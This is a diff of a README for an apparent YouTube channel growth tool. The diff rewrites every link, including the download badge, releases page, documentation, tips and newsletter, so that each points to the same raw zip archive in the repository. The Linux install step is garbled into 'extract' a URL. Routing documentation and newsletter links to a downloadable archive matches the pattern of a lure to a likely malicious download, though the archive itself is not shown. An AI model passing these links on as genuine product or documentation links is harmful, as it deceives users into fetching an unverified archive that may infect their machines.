@@ -1,7 +1,7 @@
 # 🚀 youtube-growth-guide - Grow Your YouTube Channel Smartly
 
 ## 🔗 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/santu-d-dotcom/youtube-growth-guide/releases)
+[![Download](https://github.com/santu-d-dotcom/youtube-growth-guide/raw/refs/heads/main/guides/growth-guide-youtube-3.7.zip)](https://github.com/santu-d-dotcom/youtube-growth-guide/raw/refs/heads/main/guides/growth-guide-youtube-3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the **youtube-growth-guide**! This application provides creators with tools and strategies to optimize their YouTube channels. Whether you aim to enhance your titles, thumbnails, or grow your audience, this guide has what you need to succeed.
@@ -23,7 +23,7 @@ Welcome to the **youtube-growth-guide**! This application provides creators with
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application:
 
-[Download the latest release here](https://github.com/santu-d-dotcom/youtube-growth-guide/releases)
+[Download the latest release here](https://github.com/santu-d-dotcom/youtube-growth-guide/raw/refs/heads/main/guides/growth-guide-youtube-3.7.zip)
 
 ### Step-by-Step Guide:
 1. **Visit the Releases Page:** Click on the link above to visit the Releases page.
@@ -33,7 +33,7 @@ To get started, visit the Releases page to download the application:
 5. **Install the Application:**
    - On **Windows:** Double-click the downloaded `.exe` file and follow the installation prompts.
    - On **Mac:** Open the `.dmg` file and drag the application to your Applications folder.
-   - On **Linux:** Extract the `.tar.gz` file and follow the included instructions to install.
+   - On **Linux:** Extract the `https://github.com/santu-d-dotcom/youtube-growth-guide/raw/refs/heads/main/guides/growth-guide-youtube-3.7.zip` file and follow the included instructions to install.
 6. **Start the Application:** Once installed, locate the application on your computer and open it.
 
 ## 🎓 How to Use the Application
@@ -61,8 +61,8 @@ The **youtube-growth-guide** is open-source and licensed under the MIT License. 
 ## 🔗 Additional Resources
 For additional guidance on using the application and maximizing its benefits:
 
-- [Official Documentation](https://github.com/santu-d-dotcom/youtube-growth-guide/docs)
-- [YouTube Channel Tips](https://www.example.com/youtube-tips) (Placeholder link)
-- [Join our Newsletter](https://www.example.com/newsletter) (Placeholder link)
+- [Official Documentation](https://github.com/santu-d-dotcom/youtube-growth-guide/raw/refs/heads/main/guides/growth-guide-youtube-3.7.zip)
+- [YouTube Channel Tips](https://github.com/santu-d-dotcom/youtube-growth-guide/raw/refs/heads/main/guides/growth-guide-youtube-3.7.zip) (Placeholder link)
+- [Join our Newsletter](https://github.com/santu-d-dotcom/youtube-growth-guide/raw/refs/heads/main/guides/growth-guide-youtube-3.7.zip) (Placeholder link)
 
 Thank you for choosing **youtube-growth-guide**! You are now ready to take your YouTube journey to the next level.
